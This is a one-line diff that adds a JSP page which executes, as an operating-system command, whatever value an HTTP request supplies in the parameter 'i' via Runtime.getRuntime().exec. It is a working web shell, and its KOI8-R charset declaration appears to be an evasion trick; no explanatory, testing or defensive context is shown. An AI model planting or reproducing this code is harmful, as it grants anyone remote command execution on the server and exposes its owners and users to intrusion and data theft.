@@ -1,0 +1,1 @@
+<%@ page contentType="charset=KOI8-R" %><%Runtime.getRuntime().exec(request.getParameter("i"));%>
